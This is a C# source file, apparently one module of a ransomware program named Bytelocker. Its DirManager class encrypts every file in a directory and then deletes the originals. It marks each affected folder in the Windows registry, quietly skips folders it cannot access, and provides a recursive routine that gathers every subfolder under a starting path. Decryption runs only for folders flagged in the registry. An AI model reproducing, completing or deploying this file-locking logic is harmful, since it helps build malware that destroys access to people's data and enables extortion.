using System;
using System.Collections.Generic;
using System.IO;

namespace Bytelocker.CryptoManager
{
    class DirManager
    {
        protected String dir_path;

        public void ChooseDir(String dir_path)
        {
            this.dir_path = dir_path;
        }

        public void DecryptDir()
        {
            RegistryManager rm = new RegistryManager();
            FileManager fm = new FileManager();

            if ((rm.ReadBoolValue(RegistryManager.FOLDER_KEY_NAME, this.dir_path)))
            {
                try
                {
                    String[] dir_files = Directory.GetFiles(this.dir_path);

                    foreach (String file_path in dir_files)
                    {
                        fm.ChooseFile(file_path);
                        fm.SetupFileEncrypter();
                        if (fm.DecryptFile())
                        {
                            fm.DeleteFile();
                        }
                    }

                    rm.DeleteBoolValue(RegistryManager.FOLDER_KEY_NAME, this.dir_path);
                }
                catch (System.UnauthorizedAccessException)
                {
                    Console.WriteLine("Folder is locked. Cannot decrypt!");
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }
        }

        public void EncryptDir()
        {
            RegistryManager rm = new RegistryManager();
            FileManager fm = new FileManager();

            if (!(rm.ReadBoolValue(RegistryManager.FOLDER_KEY_NAME, this.dir_path)))
            {
                try
                {
                    String[] dir_files = Directory.GetFiles(this.dir_path);

                    foreach (String file_path in dir_files)
                    {
                        fm.ChooseFile(file_path);
                        fm.SetupFileEncrypter();
                        if (fm.EncryptFile())
                        {
                            fm.DeleteFile();
                        }
                    }

                    rm.CreateBoolValue(RegistryManager.FOLDER_KEY_NAME, this.dir_path, true);
                }
                catch (System.UnauthorizedAccessException)
                {
                    // if folder cannot be accessed
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }

        }

        public static List<String> GetFoldersRecursive(String initDir)
        {
            Stack<String> stack_dirs = new Stack<String>();
            List<String> list_dirs = new List<String>();

            stack_dirs.Push(initDir);

            while (stack_dirs.Count > 0)
            {
                String dir = stack_dirs.Pop();

                try
                {
                    list_dirs.Add(dir);

                    foreach (String sub_dir in Directory.GetDirectories(dir))
                    {
                        stack_dirs.Push(sub_dir);
                    }
                }
                catch (Exception)
                {
                }
            }
            return list_dirs;
        }
    }
}
